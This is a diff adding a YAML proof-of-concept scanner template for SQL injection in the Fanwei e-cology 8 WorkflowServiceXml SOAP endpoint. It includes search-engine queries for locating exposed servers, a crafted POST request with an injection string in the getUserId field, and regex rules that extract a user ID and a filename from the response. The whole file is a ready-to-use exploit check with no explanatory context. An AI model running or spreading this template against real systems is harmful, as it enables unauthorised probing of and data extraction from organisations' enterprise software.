@@ -1,0 +1,51 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: body="/jquery.cycle.all_wev8.js"
+    hunter-query: web.body="/jquery.cycle.all_wev8.js"
+    quake-query: body:"/jquery.cycle.all_wev8.js"
+    zoomeye-query:
+    threatbook-query: 
+    cve: 
+    cnvd:
+    tips:
+
+name: poc-yaml-fanwei-ecology8-WorkflowServiceXml-sqli
+transport: http
+set:
+  s0: randomInt(1000,9999)
+  s1: randomLowercase(8)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /services/WorkflowServiceXml 
+      headers:
+        Cookie: ecology_JSessionid=aaaBARi23vekqguNfrVDy
+        Content-Type: text/xml;charset=UTF-8
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+      body: |
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn">
+          <soapenv:Header/>
+          <soapenv:Body>
+            <web:getUserId>
+          <web:string>loginId = ? ;*--</web:string>
+        <web:string>xx</web:string>
+            </web:getUserId>
+          </soapenv:Body>
+        </soapenv:Envelope>
+    expression: response.status == 200 && response.content_type.contains("xml")
+
+    output:
+      search: |-
+        "(?P<data>2[\\d]{7})".bsubmatch(response.body)
+      data: search["data"]
+      search1: |-
+        "(?P<filename>UNIS.*?txt)".bsubmatch(response.body)
+      filename: search1["filename"]
+
+expression: r0() 
